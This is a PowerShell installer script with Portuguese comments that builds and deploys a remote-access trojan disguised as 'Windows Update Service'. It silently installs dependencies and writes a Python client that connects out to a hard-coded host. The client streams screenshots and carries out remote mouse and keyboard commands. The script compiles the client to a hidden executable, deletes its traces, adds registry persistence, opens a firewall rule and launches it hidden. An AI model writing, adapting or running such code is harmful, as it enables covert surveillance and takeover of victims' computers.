# Script PowerShell - Execução Completamente Invisível
# Salve como: instalador_silencioso.ps1

# Configuração para execução invisível
$Host.UI.RawUI.WindowTitle = "Windows Update Service"

# Verifica se o Python está instalado
try {
    $pythonVersion = python --version 2>$null
    if (-not $pythonVersion) {
        exit 1
    }
} catch {
    exit 1
}

# Instala dependências silenciosamente
try {
    pip install Pillow pynput pywin32 pyinstaller --quiet --disable-pip-version-check 2>$null
    if ($LASTEXITCODE -ne 0) {
        pip install Pillow --quiet --disable-pip-version-check 2>$null
        pip install pynput --quiet --disable-pip-version-check 2>$null
        pip install pywin32 --quiet --disable-pip-version-check 2>$null
        pip install pyinstaller --quiet --disable-pip-version-check 2>$null
    }
} catch {
    # Continua silenciosamente
}

# Configuração automática
$CLIENT_HOST = "172.20.10.4"
$CLIENT_PORT = 8443

# Cria diretório de instalação
$INSTALL_DIR = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate"
if (-not (Test-Path $INSTALL_DIR)) {
    New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null
}

# Cria diretórios necessários
$dirs = @(
    "$env:APPDATA\Microsoft",
    "$env:APPDATA\Microsoft\Windows",
    "$env:APPDATA\Microsoft\Windows\Start Menu",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
)

foreach ($dir in $dirs) {
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
}

# Cria o servidor Python
$pythonCode = @"
import socket, threading, json, base64, time, os, sys
from PIL import ImageGrab
import io
import win32gui, win32con, win32api
import subprocess
import ctypes

class RemoteServer:
    def __init__(self, client_host='$CLIENT_HOST', client_port=$CLIENT_PORT):
        self.client_host = client_host
        self.client_port = client_port
        self.socket = None
        self.connected = False
        self.running = False
        self.server_name = os.environ.get('COMPUTERNAME', 'PC-Desconhecido')
        self.server_info = {'name': self.server_name, 'user': os.environ.get('USERNAME', 'Usuario'), 'os': os.name}
        self.buffer = b''

    def start_connection(self):
        self.running = True
        while self.running:
            try:
                if not self.connected: self.connect_to_client()
                if self.connected: self.handle_communication()
            except Exception as e:
                self.connected = False
                time.sleep(5)

    def connect_to_client(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.client_host, self.client_port))
            self.socket.send(json.dumps(self.server_info).encode())
            self.socket.settimeout(None)
            self.connected = True
            self.buffer = b''
        except Exception as e:
            self.connected = False
            if self.socket: self.socket.close()

    def handle_communication(self):
        try:
            while self.connected and self.running:
                data = self.socket.recv(1024)
                if not data:
                    raise Exception("Conexao fechada pelo cliente")
                self.buffer += data
                self.process_buffer()
        except Exception as e:
            self.connected = False
            if self.socket: self.socket.close()

    def process_buffer(self):
        while self.buffer:
            try:
                buffer_str = self.buffer.decode('utf-8')
                decoder = json.JSONDecoder()
                command, end = decoder.raw_decode(buffer_str)
                self.process_command(command)
                self.buffer = self.buffer[end:]
            except json.JSONDecodeError:
                break
            except UnicodeDecodeError:
                break

    def process_command(self, command):
        command_type = command.get("type")
        if command_type == "get_screenshot": self.send_screenshot()
        elif command_type == "mouse_click": self.handle_mouse_click(command)
        elif command_type == "mouse_move": self.handle_mouse_move(command)
        elif command_type == "key_press": self.handle_key_press(command)
        elif command_type == "ping": self.send_pong()

    def send_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='PNG')
            img_data = img_buffer.getvalue()
            img_base64 = base64.b64encode(img_data).decode()
            response = {"type": "screenshot", "data": img_base64, "width": screenshot.width, "height": screenshot.height}
            self.socket.send(json.dumps(response).encode())
        except Exception as e: pass

    def handle_mouse_click(self, command):
        try:
            x, y = command.get("x", 0), command.get("y", 0)
            button, action = command.get("button", "left"), command.get("action", "click")
            if action == "click":
                if button == "left":
                    win32api.SetCursorPos((x, y))
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x, y, 0, 0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x, y, 0, 0)
                elif button == "right":
                    win32api.SetCursorPos((x, y))
                    win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, x, y, 0, 0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, x, y, 0, 0)
        except Exception as e: pass

    def handle_mouse_move(self, command):
        try:
            x, y = command.get("x", 0), command.get("y", 0)
            win32api.SetCursorPos((x, y))
        except Exception as e: pass

    def handle_key_press(self, command):
        try:
            key, action = command.get("key", ""), command.get("action", "press")
            key_map = {"enter": win32con.VK_RETURN, "tab": win32con.VK_TAB, "space": win32con.VK_SPACE, "ctrl": win32con.VK_CONTROL, "alt": win32con.VK_MENU, "shift": win32con.VK_SHIFT, "win": win32con.VK_LWIN, "esc": win32con.VK_ESCAPE, "backspace": win32con.VK_BACK, "delete": win32con.VK_DELETE}
            vk_code = key_map.get(key, ord(key.upper()) if len(key) == 1 else 0)
            if action == "press":
                win32api.keybd_event(vk_code, 0, 0, 0)
                win32api.keybd_event(vk_code, 0, win32con.KEYEVENTF_KEYUP, 0)
        except Exception as e: pass

    def send_pong(self):
        try:
            response = {"type": "pong", "timestamp": time.time()}
            self.socket.send(json.dumps(response).encode())
        except Exception as e: pass

    def stop(self):
        self.running = False
        self.connected = False
        if self.socket: self.socket.close()

def main():
    CLIENT_HOST = '$CLIENT_HOST'
    CLIENT_PORT = $CLIENT_PORT
    server = RemoteServer(CLIENT_HOST, CLIENT_PORT)
    try:
        server.start_connection()
    except KeyboardInterrupt:
        server.stop()

if __name__ == "__main__":
    main()
"@

# Salva o código Python
$pythonCode | Out-File -FilePath "$INSTALL_DIR\remote_server.py" -Encoding UTF8

# Compila para executável invisível
Set-Location $INSTALL_DIR
pyinstaller --onefile --windowed --name "WindowsUpdateService" "remote_server.py" 2>$null

# Remove arquivos temporários
if (Test-Path "$INSTALL_DIR\build") { Remove-Item -Path "$INSTALL_DIR\build" -Recurse -Force }
if (Test-Path "$INSTALL_DIR\remote_server.spec") { Remove-Item -Path "$INSTALL_DIR\remote_server.spec" -Force }
if (Test-Path "$INSTALL_DIR\remote_server.py") { Remove-Item -Path "$INSTALL_DIR\remote_server.py" -Force }

# Remove arquivo .bat do Startup se existir
if (Test-Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.bat") {
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.bat" -Force
}

# Configura inicialização automática
$regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regValue = "`"$INSTALL_DIR\dist\WindowsUpdateService.exe`""
Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value $regValue -Force

# Configura firewall
netsh advfirewall firewall add rule name="WindowsUpdate" dir=out action=allow protocol=TCP remoteport=$CLIENT_PORT 2>$null

# Inicia o serviço
Set-Location "$INSTALL_DIR\dist"
Start-Process -FilePath "WindowsUpdateService.exe" -WindowStyle Hidden

exit 0